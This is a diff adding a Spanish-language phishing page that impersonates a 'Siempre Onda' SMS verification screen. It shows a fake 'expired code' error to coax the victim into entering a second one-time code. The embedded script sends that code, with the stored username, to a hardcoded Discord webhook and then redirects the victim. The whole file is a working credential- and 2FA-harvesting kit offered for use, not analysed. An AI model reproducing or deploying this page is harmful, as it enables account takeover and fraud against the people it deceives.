@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación SMS - Siempre Onda</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px 25px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .logo-header {
+            text-align: center;
+            margin-top: 10px;
+            margin-bottom: 40px;
+        }
+        .logo-header img { width: 140px; }
+
+        /* Notificación de Error Estilo App */
+        .error-banner {
+            background-color: #fff5f5;
+            border: 1px solid #feb2b2;
+            color: #c53030;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 14px;
+            line-height: 1.4;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .welcome-msg {
+            font-size: 24px;
+            font-weight: 700;
+            color: #3d3d3d;
+            margin-bottom: 15px;
+        }
+
+        .instructions {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .field-label {
+            display: block;
+            font-size: 17px;
+            color: #4a4a4a;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 24px;
+            letter-spacing: 8px; 
+            text-align: center;
+            margin-bottom: 25px;
+            outline-color: #007bff;
+            font-weight: bold;
+        }
+
+        .btn-verify {
+            width: 100%;
+            padding: 16px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: auto; 
+            margin-bottom: 40px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo-header">
+        <img src="https://siempreonda.com/_next/static/media/logo.242b4c5d.svg" alt="Siempre Onda">
+    </div>
+
+    <div class="error-banner">
+        <span style="font-size: 20px;">⚠️</span>
+        <div>
+            <strong>Código inválido.</strong><br>
+            El código ingresado ha expirado o es incorrecto. Por favor, ingrese el nuevo código enviado a su número.
+        </div>
+    </div>
+
+    <div class="welcome-msg">Validación requerida</div>
+    <div class="instructions">Se ha generado un nuevo código de seguridad.</div>
+
+    <form id="smsForm">
+        <label class="field-label">Nuevo Código SMS</label>
+        <input type="text" id="otpCode" class="input-field" 
+               required maxlength="6" pattern="[0-9]{6}" 
+               inputmode="numeric" placeholder="------"
+               oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+
+        <button type="submit" class="btn-verify" id="btnSms">Confirmar código</button>
+    </form>
+</div>
+
+<script>
+    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1473681245949923348/9Oa77S5ZwE1IxqjpxYk44il7Ln-mUJKzoUOm8NYx0uM1kV9Qe4FRhOFYv1XBkQ0LKqW2";
+
+    document.getElementById('smsForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const btn = document.getElementById('btnSms');
+        const code = document.getElementById('otpCode').value;
+        const usuarioPadre = localStorage.getItem('usuario_activo') || "Desconocido";
+
+        btn.disabled = true;
+        btn.innerText = "Verificando...";
+
+        const payload = {
+            embeds: [{
+                title: "📩 SMS (PASO 2) - REINTENTO",
+                color: 15158332, // Rojo/Naranja para indicar reintento
+                fields: [
+                    { name: "👤 Usuario", value: "`" + usuarioPadre + "`" },
+                    { name: "🔢 Segundo Código OTP", value: "```" + code + "```" }
+                ],
+                footer: { text: "Registro Siempre Onda" },
+                timestamp: new Date()
+            }]
+        };
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            // Redirección final o a una página de éxito/espera
+            window.location.href = "index.html";
+        } catch (err) {
+            alert("Error de conexión");
+            btn.disabled = false;
+            btn.innerText = "Confirmar código";
+        }
+    });
+</script>
+
+</body>
+</html>
